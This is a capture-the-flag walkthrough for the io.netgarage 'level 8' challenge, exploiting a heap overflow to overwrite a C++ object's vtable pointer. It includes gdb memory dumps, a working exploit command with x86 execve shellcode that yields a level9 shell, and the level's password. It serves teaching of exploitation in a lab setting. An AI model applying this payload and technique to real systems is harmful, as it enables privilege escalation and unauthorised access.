---

title: Level 8
link: ssh level8@io.netgarage.org

---

This challenges involves messing up the vtables for the created objects. Vtable holds the information of the virtual function defined in the class. In our case, the `operator+` is defined only once, and both objects `x` and `y` can access it at run-time. If there was a more complex case, with inheritance, the object could lookup the vtable to select the correct function to call.

In our case the memory for the objects look like:

    VTABLE  pointer to `operator+`
    DATA    annotation buffer
            number

And because we have two objects, the interesting memory will look like:

    y   VTABLE  pointer to `operator+`
        DATA    annotation buffer
                number
    x   VTABLE  pointer to `operator+`
        DATA    annotation buffer
                number

We can verify that quite easily with gdb:

    level8@io:/levels$ gdb ./level08
    (gdb) disass main
    Dump of assembler code for function main:
       ...
       0x080486cb <+55>:    call   0x804879e <_ZN6NumberC1Ei>
       0x080486d0 <+60>:    mov    %ebx,0x10(%esp)
       ...
       0x080486ef <+91>:    call   0x804879e <_ZN6NumberC1Ei>
       0x080486f4 <+96>:    mov    %ebx,0x14(%esp)
       ...
    End of assembler dump.
    (gdb) b *0x080486f8
    Breakpoint 1 at 0x80486f8
    (gdb) r 1
    Starting program: /levels/level08 1
    /bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)

    Breakpoint 1, 0x080486f8 in main ()
    (gdb) x $esp+0x10
    0xbffffc30:     0x0804a008
    (gdb) x/40 0x0804a008
    0x804a008:      0x080488c8      0x00000000      0x00000000      0x00000000
    0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a068:      0x00000000      0x00000000      0x00000005      0x00000071
    0x804a078:      0x080488c8      0x00000000      0x00000000      0x00000000
    0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
    (gdb) x $esp+0x14
    0xbffffc34:     0x0804a078

We're looking at the first `Number` created, which vtable is located at the address `0x804a008`, we have an address, then a long and empty buffer and two non-empty fields. We find the second vtable at the address `0x804a078`, which corresponds to the second `Number`.

The function at location is indeed the `operator+` for the class `Number`:

    (gdb) x 0x080488c8
    0x80488c8 <_ZTV6Number+8>:      0x080487e2

Another thing, the operation we're really doing is `y + x` so the `operator+` is called on `y`, after we setup the annotation on `x`. Our attack is clearly the following: overflow `annotation` on `x` to write another address on `y`'s vtable.

The distance between `x`'s annotation and `y`'s vtable is:

    (gdb) p 0x804a078 - 0x804a00c
    $2 = 108

Let's try that:

    (gdb) r $(python -c 'print "A"*108 + "BCDE"')
    Starting program: /levels/level08 $(python -c 'print "A"*108 + "BCDE"')
    /bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
    0x080486fc in main ()
    (gdb) x/40 0x0804a008
    0x804a008:      0x080488c8      0x00000000      0x00000000      0x00000000
    0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a068:      0x00000000      0x00000000      0x00000005      0x00000071
    0x804a078:      0x080488c8      0x00000000      0x00000000      0x00000000
    0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
    (gdb) ni
    0x08048720 in main ()
    (gdb) x/40 0x0804a008
    0x804a008:      0x080488c8      0x41414141      0x41414141      0x41414141
    0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
    0x804a028:      0x41414141      0x41414141      0x41414141      0x41414141
    0x804a038:      0x41414141      0x41414141      0x41414141      0x41414141
    0x804a048:      0x41414141      0x41414141      0x41414141      0x41414141
    0x804a058:      0x41414141      0x41414141      0x41414141      0x41414141
    0x804a068:      0x41414141      0x41414141      0x41414141      0x41414141
    0x804a078:      0x45444342      0x00000000      0x00000000      0x00000000
    0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000

The address was replaced with our custom string, nice!

Now let's inject a shellcode in the annotation to have the following exploit:

    [ x's annotation ]
    [ 108                                         ]
    [ shellcode address ] [ shellcode ] [ padding ] [ x's annotation address ]
    [ 4                     23            81      ] [ 4                      ]

    (gdb) r $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*81 + "\x0c\xa0\x04\x08"')
    sh: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
    sh-4.3$

Nice, let's do that outside now:

    level8@io:/levels$ ./level8 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*81 + "\x0c\xa0\x04\x08"')
    sh: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
    sh-4.3$ whoami
    level9
    sh-4.3$ cat /home/level9/.pass
    ise9uHhjOhZd0K4G

> ise9uHhjOhZd0K4G
